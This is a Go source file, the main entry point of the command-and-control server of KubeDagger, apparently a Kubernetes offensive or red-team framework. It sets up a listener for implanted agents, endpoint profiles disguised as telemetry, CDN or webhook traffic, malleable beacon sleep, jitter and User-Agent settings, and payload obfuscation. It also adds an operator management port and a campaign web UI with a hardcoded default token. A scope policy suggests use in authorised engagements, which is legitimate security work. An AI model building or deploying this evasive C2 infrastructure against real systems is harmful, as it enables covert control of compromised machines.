package main

import (
	"context"
	"flag"
	"os"
	"os/signal"
	"syscall"

	"github.com/sirupsen/logrus"
	"github.com/yasindce1998/KubeDagger/pkg/agent/stealth"
	"github.com/yasindce1998/KubeDagger/pkg/c2server"
	"github.com/yasindce1998/KubeDagger/pkg/events"
	"github.com/yasindce1998/KubeDagger/pkg/kubedagger/c2"
	"github.com/yasindce1998/KubeDagger/pkg/malleable"
	"github.com/yasindce1998/KubeDagger/pkg/scope"
	"github.com/yasindce1998/KubeDagger/pkg/webui"
)

func main() {
	var (
		listenAddr = flag.String("listen", "0.0.0.0:443", "HTTP/2 listener address for agents")
		mgmtAddr   = flag.String("mgmt", "127.0.0.1:9443", "management port for operator CLI")
		keyHex     = flag.String("key", "", "shared encryption key (hex) for management port")
		tlsCA      = flag.String("ca", "", "path to CA cert PEM (auto-generate if empty)")
		tlsCert    = flag.String("cert", "", "path to server cert PEM")
		tlsKey     = flag.String("key-file", "", "path to server key PEM")
		plaintext  = flag.Bool("plaintext", false, "disable TLS (development only)")
		logLevel   = flag.String("log-level", "info", "log level (debug, info, warn, error)")
		profile    = flag.String("profile", "legacy", "endpoint profile: legacy, telemetry, cdn, webhook")
		rateLimit  = flag.Float64("rate-limit", 0, "requests per second per IP (0 = disabled)")
		rateBurst  = flag.Int("rate-burst", 0, "rate limit burst (default: 2x rate-limit)")
		obfuscKey  = flag.String("obfusc-key", "", "shared secret for payload obfuscation")
		psk        = flag.String("psk", "", "pre-shared key for agent auth (X-Api-Key)")
		eventsPath = flag.String("events", "", "path to JSONL event log (enables structured telemetry, report generation, and web UI campaign views)")
		scopePath  = flag.String("scope", "", "path to scope policy YAML (allowed namespaces/domains/CIDRs; tasks outside scope are rejected)")
		mallPath   = flag.String("malleable", "", "path to malleable C2 profile YAML (beacon sleep/jitter/User-Agent)")
		webuiAddr  = flag.String("webui", "", "start the web UI (campaign timeline + replay) on this address (e.g. 127.0.0.1:8080; empty = disabled)")
		webuiToken = flag.String("webui-token", "kubedagger", "web UI authentication token")
	)
	flag.Parse()

	level, err := logrus.ParseLevel(*logLevel)
	if err != nil {
		logrus.Fatalf("invalid log level: %v", err)
	}
	logrus.SetLevel(level)

	cfg := c2server.ServerConfig{
		ListenAddr: *listenAddr,
		Endpoints:  stealth.GetProfile(*profile),
		RateLimit:  *rateLimit,
		RateBurst:  *rateBurst,
		ObfuscKey:  *obfuscKey,
		PSK:        *psk,
	}

	if *eventsPath != "" {
		store, err := events.NewStore(*eventsPath)
		if err != nil {
			logrus.Fatalf("event store setup failed: %v", err)
		}
		cfg.Events = store
		defer func() { _ = store.Close() }()
		logrus.Infof("structured event telemetry enabled: %s", *eventsPath)
	}

	if *scopePath != "" {
		scp, err := scope.Load(*scopePath)
		if err != nil {
			logrus.Fatalf("scope policy load failed: %v", err)
		}
		cfg.Scope = scp
		logrus.Infof("scope enforcement enabled: %d namespace(s), %d domain(s), %d CIDR(s)",
			len(scp.Namespaces), len(scp.Domains), len(scp.CIDRs))
	}

	if *mallPath != "" {
		prof, err := malleable.Load(*mallPath)
		if err != nil {
			logrus.Fatalf("malleable profile load failed: %v", err)
		}
		cfg.Profile = prof
		logrus.Infof("malleable profile %q active: %ds base sleep, %d%% jitter, %d user agent(s)",
			prof.Name, prof.SleepBaseSeconds, prof.JitterPct, len(prof.UserAgents))
	}

	if !*plaintext {
		tlsCfg, caPEM, err := setupTLS(*tlsCA, *tlsCert, *tlsKey, *listenAddr)
		if err != nil {
			logrus.Fatalf("TLS setup failed: %v", err)
		}
		cfg.TLSConfig = tlsCfg
		_ = caPEM
	}

	srv := c2server.NewServer(cfg)
	if err := srv.Start(); err != nil {
		logrus.Fatalf("server start failed: %v", err)
	}

	if *keyHex != "" {
		key, err := c2.DeriveKey(*keyHex)
		if err != nil {
			logrus.Fatalf("invalid management key: %v", err)
		}
		mgmt, err := c2server.NewMgmtServer(key, srv.Agents(), srv.Tasks(),
			c2server.WithMgmtEvents(srv.Events()), c2server.WithMgmtScope(srv.Scope()))
		if err != nil {
			logrus.Fatalf("mgmt server failed: %v", err)
		}
		if err := mgmt.Start(*mgmtAddr); err != nil {
			logrus.Fatalf("mgmt listen failed: %v", err)
		}
		logrus.Infof("management port on %s", *mgmtAddr)
	}

	if *webuiAddr != "" {
		ui := webui.NewServerWithEvents(*webuiAddr, *webuiToken, srv.Events())
		go func() {
			ctx := context.Background()
			if err := ui.Start(ctx); err != nil {
				logrus.Errorf("web UI failed: %v", err)
			}
		}()
		logrus.Infof("web UI (campaign/replay) on http://%s", *webuiAddr)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	<-sig

	logrus.Info("shutting down...")
	ctx, cancel := context.WithTimeout(context.Background(), 5000000000)
	defer cancel()
	_ = srv.Stop(ctx)
}
